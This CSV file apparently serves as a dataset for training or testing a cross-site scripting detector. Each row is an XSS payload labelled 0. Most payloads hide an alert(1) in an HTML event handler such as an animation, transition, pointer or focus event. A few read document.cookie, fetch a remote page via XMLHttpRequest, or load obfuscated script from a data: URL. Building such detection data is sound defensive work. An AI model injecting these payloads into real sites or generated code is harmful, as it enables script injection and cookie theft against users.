query,label
"<style>@keyframes slidein {}</style><acronym style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></acronym>",0
"<u onkeyup=""alert(1)"" contenteditable>test</u>",0
<slot id=x tabindex=1 onactivate=alert(1)></slot>,0
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",0
<%<!--'%><script>alert(1);</script -->,0
"<br onmouseup=""alert(1)"">test</br>",0
<b onpointerout=alert(1)>XSS</b>,0
"<caption onbeforecut=""alert(1)"" contenteditable>test</caption>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></iframe>",0
"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>",0
<blink id=x tabindex=1 onfocusin=alert(1)></blink>,0
"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" ontransitionstart=alert(1)></img>",0
"<style>@keyframes x{}</style><em style=""animation-name:x"" onwebkitanimationend=""alert(1)""></em>",0
"<span oncontextmenu=""alert(1)"">test</span>",0
<rp id=x tabindex=1 onactivate=alert(1)></rp>,0
"<ul onmousedown=""alert(1)"">test</ul>",0
"<spacer onkeyup=""alert(1)"" contenteditable>test</spacer>",0
<style id=x tabindex=1 onactivate=alert(1)></style>,0
<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>,0
"<tr draggable=""true"" ondragleave=""alert(1)"">test</tr>",0
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionstart=alert(1)></optgroup>",0
<tbody id=x tabindex=1 onactivate=alert(1)></tbody>,0
"<tbody oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<style>@keyframes x{}</style><video style=""animation-name:x"" onwebkitanimationend=""alert(1)""></video>",0
"<style>:target {color:red;}</style><details id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></details>",0
"<style>:target {transform: rotate(180deg);}</style><ul id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ul>",0
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,0
"<source oncontextmenu=""alert(1)"">test</source>",0
"<style>@keyframes slidein {}</style><q style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></q>",0
"<style>@keyframes x{}</style><img style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></img>",0
"<samp onmousedown=""alert(1)"">test</samp>",0
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,0
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>,0
"<sup onmousedown=""alert(1)"">test</sup>",0
<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>,0
"<acronym oncontextmenu=""alert(1)"">test</acronym>",0
"<select draggable=""true"" ondragenter=""alert(1)"">test</select>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></label>",0
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationend=""alert(1)""></isindex>",0
"<style>:target {color:red;}</style><samp id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></samp>",0
"<plaintext onbeforecut=""alert(1)"" contenteditable>test</plaintext>",0
<style onpointerover=alert(1)>XSS</style>,0
<body/onload=&lt;!--&gt;&#10alert(1)>,0
"<style>@keyframes x{}</style><output style=""animation-name:x"" onwebkitanimationend=""alert(1)""></output>",0
"<abbr onmouseleave=""alert(1)"">test</abbr>",0
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",0
"<style>:target {color: red;}</style><audio2 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio2>",0
"<style>:target {color:red;}</style><image2 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></image2>",0
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",0
"<a2 draggable=""true"" ondrag=""alert(1)"">test</a2>",0
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",0
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)></xmp>",0
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,0
"<sub onmousemove=""alert(1)"">test</sub>",0
<base onpointerover=alert(1)>XSS</base>,0
<output onafterscriptexecute=alert(1)><script>1</script>,0
"<script onmousemove=""alert(1)"">test</script>",0
"<style>@keyframes x{}</style><p style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></p>",0
"<td onmousemove=""alert(1)"">test</td>",0
<img src=`xx:xx`onerror=alert(1)>,0
"<style onmouseup=""alert(1)"">test</style>",0
"<rt onpaste=""alert(1)"" contenteditable>test</rt>",0
"<style>@keyframes slidein {}</style><sup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></sup>",0
"<style>:target {transform: rotate(180deg);}</style><header id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></header>",0
<audio2 onpointermove=alert(1)>XSS</audio2>,0
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationstart=""alert(1)""></dd>",0
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",0
"<video2 onmouseup=""alert(1)"">test</video2>",0
"<table onbeforepaste=""alert(1)"" contenteditable>test</table>",0
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",0
<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>,0
"<samp oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<style>:target {transform: rotate(180deg);}</style><menu id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menu>",0
"<dt draggable=""true"" ondragenter=""alert(1)"">test</dt>",0
"<style>:target {color:red;}</style><animate id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></animate>",0
<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>,0
"<thead onmousemove=""alert(1)"">test</thead>",0
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onwebkitanimationend=""alert(1)""></thead>",0
"<picture onmouseleave=""alert(1)"">test</picture>",0
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></img>",0
"<progress onmousemove=""alert(1)"">test</progress>",0
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onwebkitanimationend=""alert(1)""></textarea>",0
"<slot onmouseleave=""alert(1)"">test</slot>",0
"<style>:target {color:red;}</style><table id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></table>",0
<source id=x tabindex=1 onfocusin=alert(1)></source>,0
"<script oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",0
"<th onmouseout=""alert(1)"">test</th>",0
"<track ondblclick=""alert(1)"" autofocus tabindex=1>test</track>",0
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,0
"<style>@keyframes slidein {}</style><animatetransform style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></animatetransform>",0
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionstart=alert(1)></picture>",0
<shadow onpointerout=alert(1)>XSS</shadow>,0
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,0
"<textarea oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationstart=""alert(1)""></ruby>",0
<tfoot onpointerout=alert(1)>XSS</tfoot>,0
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",0
"<style ondblclick=""alert(1)"" autofocus tabindex=1>test</style>",0
<rt onpointerenter=alert(1)>XSS</rt>,0
<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>,0
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",0
"<style>@keyframes slidein {}</style><base style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></base>",0
"<style>:target {color:red;}</style><output id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></output>",0
"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",0
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></applet>",0
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdo>",0
"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",0
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,0
"<style>@keyframes x{}</style><iframe2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></iframe2>",0
"<style>:target {color:red;}</style><tr id=x style=""transition:color 1s"" ontransitionstart=alert(1)></tr>",0
"<dir onmouseup=""alert(1)"">test</dir>",0
"<output onmousemove=""alert(1)"">test</output>",0
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationend=""alert(1)""></output>",0
<tbody onpointerenter=alert(1)>XSS</tbody>,0
"<style>:target {color: red;}</style><rtc id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rtc>",0
"<video2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<p onmousemove=""alert(1)"">test</p>",0
"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></style>",0
"<style>:target {color:red;}</style><input2 id=x style=""transition:color 1s"" ontransitionend=alert(1)></input2>",0
"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",0
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onwebkitanimationend=""alert(1)""></nobr>",0
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" ontransitionstart=alert(1)></meta>",0
"<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",0
"<svg onmousedown=""alert(1)"">test</svg>",0
"<style>:target {color: red;}</style><meter id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meter>",0
"<output onkeyup=""alert(1)"" contenteditable>test</output>",0
<blink onpointerrawupdate=alert(1)>XSS</blink>,0
"<style onkeyup=""alert(1)"" contenteditable>test</style>",0
"<dialog onkeypress=""alert(1)"" contenteditable>test</dialog>",0
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationend=""alert(1)""></menuitem>",0
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationstart=""alert(1)""></li>",0
"<u draggable=""true"" ondragstart=""alert(1)"">test</u>",0
"<track onmouseenter=""alert(1)"">test</track>",0
"<title oncontextmenu=""alert(1)"">test</title>",0
"<q onmouseout=""alert(1)"">test</q>",0
"<samp onmouseout=""alert(1)"">test</samp>",0
<dl onpointermove=alert(1)>XSS</dl>,0
<article onmousewheel=alert(1)>requires scrolling,0
"<style onbeforepaste=""alert(1)"" contenteditable>test</style>",0
<b onpointerrawupdate=alert(1)>XSS</b>,0
<section id=x tabindex=1 onactivate=alert(1)></section>,0
<ruby onpointerup=alert(1)>XSS</ruby>,0
"<style>:target {color:red;}</style><center id=x style=""transition:color 1s"" ontransitionstart=alert(1)></center>",0
<applet onpointerdown=alert(1)>XSS</applet>,0
"<button ondblclick=""alert(1)"" autofocus tabindex=1>test</button>",0
"<style>@keyframes slidein {}</style><input2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></input2>",0
<s onpointerleave=alert(1)>XSS</s>,0
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(1)""></nobr>",0
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onwebkitanimationend=""alert(1)""></figure>",0
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></p>",0
"<select onclick=""alert(1)"">test</select>",0
"<rb onclick=""alert(1)"">test</rb>",0
<param id=x tabindex=1 onfocus=alert(1)></param>,0
<audio2 id=x tabindex=1 onbeforedeactivate=alert(1)></audio2><input autofocus>,0
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" ontransitionstart=alert(1)></label>",0
"<style>:target {color:red;}</style><h1 id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></h1>",0
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",0
"<applet onmousemove=""alert(1)"">test</applet>",0
<dir id=x tabindex=1 onactivate=alert(1)></dir>,0
<svg onpointerdown=alert(1)>XSS</svg>,0
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",0
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,0
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></nav>",0
"<q onkeydown=""alert(1)"" contenteditable>test</q>",0
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",0
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",0
<td onpointerup=alert(1)>XSS</td>,0
"<style>@keyframes slidein {}</style><label style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></label>",0
<progress onbeforescriptexecute=alert(1)><script>1</script>,0
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,0
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationend=""alert(1)""></source>",0
<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,0
<rtc onpointerdown=alert(1)>XSS</rtc>,0
<td onafterscriptexecute=alert(1)><script>1</script>,0
<template onmousewheel=alert(1)>requires scrolling,0
<table id=x tabindex=1 onactivate=alert(1)></table>,0
<small onpointerenter=alert(1)>XSS</small>,0
"<dt ondblclick=""alert(1)"" autofocus tabindex=1>test</dt>",0
"<dir onmousedown=""alert(1)"">test</dir>",0
"<element onmouseup=""alert(1)"">test</element>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></li>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></span>",0
<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>,0
<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,0
"<style>:target {transform: rotate(180deg);}</style><image3 id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></image3>",0
"<thead onpaste=""alert(1)"" contenteditable>test</thead>",0
<tfoot onmousewheel=alert(1)>requires scrolling,0
"<button oncontextmenu=""alert(1)"">test</button>",0
"<q ondblclick=""alert(1)"" autofocus tabindex=1>test</q>",0
<template onpointerenter=alert(1)>XSS</template>,0
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,0
<dialog onpointermove=alert(1)>XSS</dialog>,0
<tbody onbeforescriptexecute=alert(1)><script>1</script>,0
"<plaintext ondblclick=""alert(1)"" autofocus tabindex=1>test</plaintext>",0
"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",0
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,0
"<rb onbeforepaste=""alert(1)"" contenteditable>test</rb>",0
"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",0
"<style>@keyframes slidein {}</style><a2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a2>",0
"<article onmousemove=""alert(1)"">test</article>",0
"<p onpaste=""alert(1)"" contenteditable>test</p>",0
"<animatemotion draggable=""true"" ondragstart=""alert(1)"">test</animatemotion>",0
"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></frameset>",0
<summary id=x tabindex=1 onfocus=alert(1)></summary>,0
<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,0
"<style>:target {transform: rotate(180deg);}</style><blink id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blink>",0
"<strike onmouseup=""alert(1)"">test</strike>",0
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,0
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rt>",0
"<textarea onmousedown=""alert(1)"">test</textarea>",0
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",0
"<applet onmouseout=""alert(1)"">test</applet>",0
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onwebkitanimationend=""alert(1)""></blockquote>",0
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></keygen>",0
<s onpointerrawupdate=alert(1)>XSS</s>,0
"<dt onmouseover=""alert(1)"">test</dt>",0
"<style>@keyframes x{}</style><image2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image2>",0
<dt onpointerup=alert(1)>XSS</dt>,0
"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></output>",0
<wbr onbeforescriptexecute=alert(1)><script>1</script>,0
"<q draggable=""true"" ondrag=""alert(1)"">test</q>",0
"<rt onbeforecopy=""alert(1)"" contenteditable>test</rt>",0
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",0
<dl onpointerleave=alert(1)>XSS</dl>,0
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,0
"<video onmouseleave=""alert(1)"">test</video>",0
"<xmp onmouseout=""alert(1)"">test</xmp>",0
<dt onmousewheel=alert(1)>requires scrolling,0
<title id=x tabindex=1 onbeforeactivate=alert(1)></title>,0
<p id=x tabindex=1 onfocusin=alert(1)></p>,0
<th onbeforescriptexecute=alert(1)><script>1</script>,0
"<style>@keyframes x{}</style><video2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></video2>",0
<animatemotion onpointerout=alert(1)>XSS</animatemotion>,0
"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image3>",0
"<time oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
<textarea onselect=alert(1) autofocus>XSS</textarea>,0
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,0
"<blink oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,0
"<body onkeydown=""alert(1)"" contenteditable>test</body>",0
"<animatetransform onmouseenter=""alert(1)"">test</animatetransform>",0
"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></keygen>",0
"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></mark>",0
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,0
<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,0
<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nextid>",0
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",0
<video onmousewheel=alert(1)>requires scrolling,0
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,0
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",0
"<style>@keyframes x{}</style><title style=""animation-name:x"" onwebkitanimationend=""alert(1)""></title>",0
"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",0
"<svg ondblclick=""alert(1)"" autofocus tabindex=1>test</svg>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",0
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,0
"<style>:target {color: red;}</style><noembed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noembed>",0
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationend=""alert(1)""></figure>",0
<tfoot onpointermove=alert(1)>XSS</tfoot>,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",0
"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",0
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",0
"<style>:target {color:red;}</style><big id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></big>",0
"<style>@keyframes slidein {}</style><picture style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></picture>",0
"<script onkeydown=""alert(1)"" contenteditable>test</script>",0
"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",0
"<canvas draggable=""true"" ondrag=""alert(1)"">test</canvas>",0
<spacer id=x tabindex=1 ondeactivate=alert(1)></spacer><input id=y autofocus>,0
"<blink onmouseenter=""alert(1)"">test</blink>",0
<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>,0
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",0
<animate onbeforescriptexecute=alert(1)><script>1</script>,0
"<style>@keyframes x{}</style><q style=""animation-name:x"" onanimationstart=""alert(1)""></q>",0
<plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>,0
"<style>:target {transform: rotate(180deg);}</style><object id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></object>",0
"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",0
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationend=""alert(1)""></i>",0
"<style>@keyframes x{}</style><input4 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></input4>",0
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></plaintext>",0
"<element onmouseleave=""alert(1)"">test</element>",0
"<abbr oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
<summary onpointermove=alert(1)>XSS</summary>,0
"<thead draggable=""true"" ondrag=""alert(1)"">test</thead>",0
